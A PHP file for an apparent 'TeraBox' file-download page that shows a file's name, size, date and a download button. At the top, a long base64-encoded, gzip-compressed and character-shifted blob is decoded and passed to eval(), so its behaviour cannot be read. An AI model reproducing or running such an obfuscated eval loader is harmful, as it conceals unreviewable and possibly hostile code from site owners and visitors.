<?php 

include_once('config.php');

function Jxy($iJlAZG)
{ 
$iJlAZG=gzinflate(base64_decode($iJlAZG));
 for($i=0;$i<strlen($iJlAZG);$i++)
 {
$iJlAZG[$i] = chr(ord($iJlAZG[$i])-1);
 }
 return $iJlAZG;
 }
 
 eval(Jxy("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"));
 ?>
<!DOCTYPE html>
<html>
<head>
    <title><?= $name; ?></title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.16/dist/tailwind.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #f7fafc;
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
            padding: 40px;
            background-color: #ffffff;
            border-radius: 10px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        .header {
            background-color: #4a90e2;
            color: #ffffff;
            padding: 20px 0;
            text-align: center;
            border-bottom-left-radius: 10px;
            border-bottom-right-radius: 10px;
        }
        .footer {
            background-color: #4a90e2;
            color: #ffffff;
            padding: 10px 0;
            text-align: center;
            position: absolute;
            bottom: 0;
            width: 100%;
            border-top-left-radius: 10px;
            border-top-right-radius: 10px;
        }
    </style>
    <meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<body>
    <div class="header">
        <h1 class="text-2xl font-bold"><a href="/">TeraBox</a></h1>
    </div>
      <br><br />
    <center>
            <div class="container mt-8">
                    <fieldset class="border p-6 rounded-md shadow-md">
                <legend class="text-lg font-semibold mb-4">File Details</legend>
        <p class='mb-4'><strong>File Name:</strong> <?= $name; ?></p>
        <p class='mb-4'><strong>File Size:</strong> <?= $size; ?></p>
        <p class='mb-4'><strong>Upload Date:</strong> <?= $date; ?></p>
        <center><a target="_blank" rel="noopener noreferrer" class="py-0 text-xl font-bold text-white self-center" href="<?= $url; ?>"><button class="bg-gray-300 hover:bg-gray-400 text-gray-800 font-bold py-2 px-4 rounded inline-flex items-center">
  <svg class="fill-current w-4 h-4 mr-2" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><path d="M13 8V2H7v6H2l8 8 8-8h-5zM0 18h20v2H0v-2z"/></svg>
  <span>Download</span>
</button></a></center>
    </div>
       </fieldset>
    </center>
    <div class="footer">
        <p>&copy; <?= date("Y"); ?> TeraBox - Developed by <a href="//shakib.eu.org">Shakib Ahmed</a></p>
    </div>
</body>
</html>